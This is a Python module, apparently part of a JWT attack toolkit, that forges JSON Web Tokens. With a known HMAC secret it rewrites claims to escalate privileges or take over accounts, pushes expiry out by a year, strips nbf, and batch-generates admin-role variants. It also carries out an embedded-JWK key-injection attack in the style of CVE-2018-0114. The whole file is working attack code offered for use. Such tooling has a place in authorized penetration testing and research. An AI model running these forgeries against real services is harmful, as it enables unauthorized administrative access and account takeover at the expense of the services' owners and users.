"""
Attack 6: Token Forgery & Claim Manipulation
---------------------------------------------
Once a secret is known (via bruteforce or confusion attack),
forge tokens with arbitrary claims — privilege escalation, account takeover, etc.

Also includes:
  - Expiry bypass (exp manipulation)
  - nbf (not before) bypass  
  - iss/aud claim tampering
  - Embedded JWK attack (inject your own public key into header)
"""

import json
import time
from .utils import decode_token, sign_hs256, sign_hs384, sign_hs512, b64url_encode


SIGN_MAP = {
    "HS256": sign_hs256,
    "HS384": sign_hs384,
    "HS512": sign_hs512,
}


def forge_token(token: str, secret: str, claims: dict,
                alg: str = None, extend_exp: int = None) -> dict:
    """
    Forge a JWT with modified claims using known secret.
    
    Args:
        token: Original token (used as template)
        secret: Known HMAC secret
        claims: Dict of claims to set/override
        alg: Override algorithm (default: keep original)
        extend_exp: Extend expiry by N seconds (0 = remove exp)
    
    Returns dict with forged token and details
    """
    header, payload, _, _ = decode_token(token)

    forged_header = dict(header)
    forged_payload = dict(payload)

    if alg:
        forged_header["alg"] = alg.upper()

    # Apply claim modifications
    forged_payload.update(claims)

    # Expiry manipulation
    if extend_exp is not None:
        if extend_exp == 0:
            forged_payload.pop("exp", None)
        else:
            forged_payload["exp"] = int(time.time()) + extend_exp

    # Update iat to now
    forged_payload["iat"] = int(time.time())

    # Remove nbf if present (avoid not-yet-valid issues)
    if "nbf" in forged_payload and extend_exp:
        forged_payload.pop("nbf", None)

    target_alg = forged_header.get("alg", "HS256").upper()
    sign_func = SIGN_MAP.get(target_alg)

    if not sign_func:
        return {"error": f"Unsupported algorithm for signing: {target_alg}"}

    forged_token = sign_func(forged_header, forged_payload, secret)

    return {
        "original_claims": payload,
        "forged_claims": forged_payload,
        "algorithm": target_alg,
        "secret": secret,
        "token": forged_token
    }


def attack_embedded_jwk(token: str, modify_payload: dict = None) -> dict:
    """
    Embedded JWK Attack (CVE-2018-0114 style):
    Inject our own RSA public key into the 'jwk' header parameter.
    Vulnerable implementations use the embedded key for verification.
    """
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding as apadding
        import base64

        header, payload, _, _ = decode_token(token)
        if modify_payload:
            payload.update(modify_payload)

        # Generate keypair
        priv = rsa.generate_private_key(65537, 2048, default_backend())
        pub = priv.public_key()
        pub_numbers = pub.public_numbers()

        def int_to_b64(n):
            length = (n.bit_length() + 7) // 8
            return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

        embedded_jwk = {
            "kty": "RSA",
            "n": int_to_b64(pub_numbers.n),
            "e": int_to_b64(pub_numbers.e),
        }

        forged_header = {
            "alg": "RS256",
            "typ": "JWT",
            "jwk": embedded_jwk
        }

        # Sign with our private key
        h = b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()

        sig = priv.sign(signing_input, apadding.PKCS1v15(), hashes.SHA256())
        forged_token = f"{h}.{p}.{b64url_encode(sig)}"

        priv_pem = priv.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()
        ).decode()

        return {
            "attack": "embedded_jwk",
            "forged_token": forged_token,
            "embedded_key": embedded_jwk,
            "private_key_pem": priv_pem,
            "note": "Vulnerable if server uses header.jwk for verification without whitelist"
        }

    except ImportError:
        return {"error": "cryptography library required: pip install cryptography"}
    except Exception as e:
        return {"error": str(e)}


def bulk_forge(token: str, secret: str, privilege_sets: list) -> list:
    """
    Forge multiple tokens with different privilege sets.
    privilege_sets: list of claim dicts
    
    Example:
        bulk_forge(token, secret, [
            {"role": "admin", "sub": "1"},
            {"role": "superuser", "sub": "0"},
            {"isAdmin": True, "sub": "1"},
        ])
    """
    results = []
    for claims in privilege_sets:
        result = forge_token(token, secret, claims, extend_exp=86400 * 365)
        results.append(result)
    return results


def common_privesc_payloads(token: str, secret: str) -> list:
    """Auto-generate common privilege escalation token variants."""
    header, payload, _, _ = decode_token(token)

    privesc_sets = [
        {"role": "admin"},
        {"role": "administrator"},
        {"role": "superuser"},
        {"role": "root"},
        {"admin": True},
        {"isAdmin": True},
        {"is_admin": True},
        {"is_superuser": True},
        {"privilege": "admin"},
        {"group": "admin"},
        {"user_type": "admin"},
        {"scope": "admin"},
        {"permissions": ["admin", "read", "write", "delete"]},
    ]

    # Add sub=0 and sub=1 variants if sub exists
    if "sub" in payload:
        for s in ("0", "1", "-1"):
            privesc_sets.append({"sub": s, "role": "admin"})

    return bulk_forge(token, secret, privesc_sets)


def run(token: str, secret: str = None, claims: dict = None,
        attack_type: str = "forge", extend_exp: int = None,
        verbose: bool = True):

    if attack_type == "embedded_jwk":
        result = attack_embedded_jwk(token, modify_payload=claims)
        if verbose:
            print(f"\n[*] EMBEDDED JWK ATTACK\n")
            if "forged_token" in result:
                print(f"  [+] {result['forged_token'][:80]}...")
                print(f"  [!] {result.get('note', '')}\n")
            else:
                print(f"  [!] {result.get('error', 'Failed')}\n")
        return result

    if not secret:
        print("  [!] Secret required for token forgery (--secret)")
        return {}

    if attack_type == "privesc":
        results = common_privesc_payloads(token, secret)
        if verbose:
            print(f"\n[*] COMMON PRIVESC PAYLOADS — {len(results)} tokens\n")
            for i, r in enumerate(results[:5]):
                if "token" in r:
                    diff = {k: v for k, v in r["forged_claims"].items()
                            if r["original_claims"].get(k) != v}
                    print(f"  [{i+1}] changes: {diff}")
                    print(f"      {r['token'][:72]}...\n")
        return results

    if claims and secret:
        result = forge_token(token, secret, claims, extend_exp=extend_exp)
        if verbose:
            print(f"\n[*] TOKEN FORGERY\n")
            if "token" in result:
                diff = {k: v for k, v in result["forged_claims"].items()
                        if result["original_claims"].get(k) != v}
                print(f"  [+] Modified claims : {diff}")
                print(f"  [+] Algorithm       : {result['algorithm']}")
                print(f"  [+] Forged token    :\n\n      {result['token']}\n")
            else:
                print(f"  [!] {result.get('error', 'Forge failed')}\n")
        return result

    print("  [!] Specify --claims or use --attack privesc")
    return {}
